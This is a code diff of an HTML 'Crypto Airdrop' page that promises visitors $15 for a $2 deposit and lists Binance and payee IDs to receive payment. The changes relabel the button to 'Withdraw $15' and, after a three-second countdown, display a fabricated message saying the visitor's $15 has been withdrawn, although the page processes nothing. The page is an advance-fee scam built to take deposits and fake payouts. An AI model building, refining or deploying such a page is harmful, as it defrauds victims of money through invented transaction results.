@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"> <!-- Prevent zooming -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Crypto Airdrop</title>
     <style>
         * {
@@ -17,14 +17,14 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh; /* Full height */
+            height: 100vh;
             color: #fff;
-            overflow: hidden; /* Prevent scrolling */
+            overflow: hidden;
         }
 
         .container {
             max-width: 90%;
-            width: 400px; /* Set fixed width for better scaling */
+            width: 400px;
             margin: auto;
             padding: 40px;
             background-color: #222;
@@ -127,22 +127,34 @@
             font-size: 16px;
             box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
         }
+
+        .result {
+            font-size: 18px;
+            color: #2ecc71;
+            margin-top: 20px;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        .result.visible {
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>Claim Your Free $15!</h1>
-    <p>Deposit $2 and receive $15 in your wallet instantly Bikash payment method support .</p>
+    <p>Deposit $2 and receive $15 in your wallet instantly. Bikash payment method support.</p>
     <form id="depositForm">
         <input type="text" id="walletAddress" placeholder="Enter your wallet address" required>
-        <button type="submit">Deposit $2</button>
+        <button type="submit">Withdraw $15</button>
     </form>
     <p class="message">Processing will take 3 seconds.</p>
-    <p class="message">Binance ID: <strong>730970857</strong></strong></p>
+    <p class="message">Binance ID: <strong>730970857</strong></p>
     <p class="message">Payee's ID: <strong>P1105473966</strong></p>
     <p id="countdown" class="countdown"></p>
-    <p id="result" class="successful withdraw done"></p>
+    <p id="result" class="result"></p>
 </div>
 
 <div class="footer">
@@ -153,29 +165,17 @@
     document.addEventListener('DOMContentLoaded', () => {
         const walletAddressInput = document.getElementById('walletAddress');
         const result = document.getElementById('result');
-        const storedWalletAddress = localStorage.getItem('walletAddress');
-        const storedPending = localStorage.getItem('pending');
-
-        if (storedWalletAddress) {
-            walletAddressInput.value = storedWalletAddress;
-            walletAddressInput.disabled = true;
-        }
-
-        if (storedPending) {
-            result.textContent = storedPending;
-        }
+        const countdown = document.getElementById('countdown');
 
         document.getElementById('depositForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const walletAddress = walletAddressInput.value;
             const button = e.target.querySelector('button');
-            const countdown = document.getElementById('countdown');
             let timeLeft = 3;
 
             button.disabled = true;
             walletAddressInput.disabled = true;
             button.textContent = 'Processing...';
-
             countdown.textContent = `Please wait: ${timeLeft} seconds`;
 
             const timer = setInterval(() => {
@@ -185,12 +185,12 @@
                 } else {
                     clearInterval(timer);
                     button.disabled = false;
-                    button.textContent = 'Deposit $2';
+                    button.textContent = 'Withdraw $15';
+                    walletAddressInput.disabled = false;
+                    walletAddressInput.value = ''; // Reset wallet address input
                     countdown.textContent = '';
-                    const pendingText = `সাফল্য! ওয়ালেট এড্রেস: ${walletAddress} - $15 সাফল্যের সাথে উইথড্র হয়েছে!`;
-                    result.textContent = pendingText;
-                    localStorage.setItem('walletAddress', walletAddress);
-                    localStorage.setItem('pending', pendingText);
+                    result.textContent = `Success! Wallet Address: ${walletAddress} - $15 has been withdrawn successfully!`;
+                    result.classList.add('visible'); // Show result with animation
                 }
             }, 1000);
         });
